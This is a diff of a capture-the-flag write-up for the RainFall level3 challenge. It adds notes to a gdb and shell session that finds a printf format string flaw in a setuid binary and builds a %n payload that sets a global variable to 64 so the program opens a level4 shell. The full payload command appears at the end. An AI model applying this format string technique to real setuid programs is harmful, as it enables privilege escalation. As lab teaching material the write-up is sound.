@@ -4,21 +4,15 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
 
 level3@RainFall:~$ ls -l
-total 8
 -rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
-
-level3@RainFall:~$ pwd
-/home/user/level3
-
-level3@RainFall:~$ id
-uid=2022(level3) gid=2022(level3) groups=2022(level3),100(users)
-
-level3@RainFall:~$ whoami
-level3
 
 level3@RainFall:~$ ./level3
 aa
 aa
+
+********************************************************************************
+What we write in the get is returned.
+********************************************************************************
 
 level3@RainFall:~$ cat level3
 ELF4l	4(44444488888�
@@ -27,6 +21,10 @@ c`�     �$(,048S��[�����������t�m��C�[��
 ��������������Ë$Ð���������U��S���8���t�8f����Ћ���u��[]Ð�S��[��3�/����[�Wait what?!D$��� �����9�u߃�[^_]��
 /bin/sh;8h���T����x����������������zR�
 ...
+
+********************************************************************************
+We can see two strings in the binary: Wait what?! ; /bin/sh
+********************************************************************************
 
 (gdb) info function
 All defined functions:
@@ -56,6 +54,10 @@ Non-debugging symbols:
 0x080485b0  __do_global_ctors_aux
 0x080485dc  _fini
 
+********************************************************************************
+There's two functions defined, main and v.
+********************************************************************************
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x0804851a <+0>:	push   %ebp
@@ -65,6 +67,10 @@ Dump of assembler code for function main:
    0x08048525 <+11>:	leave
    0x08048526 <+12>:	ret
 End of assembler dump.
+
+********************************************************************************
+The main set the stack and call v.
+********************************************************************************
 
 (gdb) disas v
 Dump of assembler code for function v:
@@ -97,6 +103,12 @@ Dump of assembler code for function v:
    0x08048519 <+117>:	ret
 End of assembler dump.
 
+********************************************************************************
+We can see that printf write the return of fgets.
+At v+59 a cmp is done that check if what is at the address 0x804988c is equal to 64.
+If it isn't it leaves the program, else it open a new shell with level4 rights.
+********************************************************************************
+
 (gdb) info variables
 All defined variables:
 
@@ -123,10 +135,23 @@ Non-debugging symbols:
 0x08049888  dtor_idx.6161
 0x0804988c  m
 
+********************************************************************************
+We see that at address 0x0804988c we have the variable m.
+********************************************************************************
+
 (gdb) run
 Starting program: /home/user/level3/level3
 AAAA BBBB CCCC DDDD %x %x %x %x %x %x %x %x %x
 AAAA BBBB CCCC DDDD 200 b7fd1ac0 b7ff37d0 41414141 42424220 43432042 44204343 20444444 25207825
+
+********************************************************************************
+printf isn't protected so we can exploit that and launch a buffer overflow attack with it.
+We see by some testing that the buffer of our string is situated on the fourth emplacement on the stack.
+We will use the %n option of printf to write in the memory the number returned by printf.
+To get 64 in the variable m we will pass the address of the variable m in a string and we will complete 
+it to reach 64 characters. Next we will pop 3 items from the stack with 3 %x to push the address of m in
+the first position on the stack. To get 64 characters we do: 64 - 4 (addresse de m) - 19 (remplacement des 3 %x = 200b7fd1ac0b7ff37d0) = 41 A to add.
+********************************************************************************
 
 level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08"+"A"*41+"%x%x%x%n")' > /tmp/exploit
 
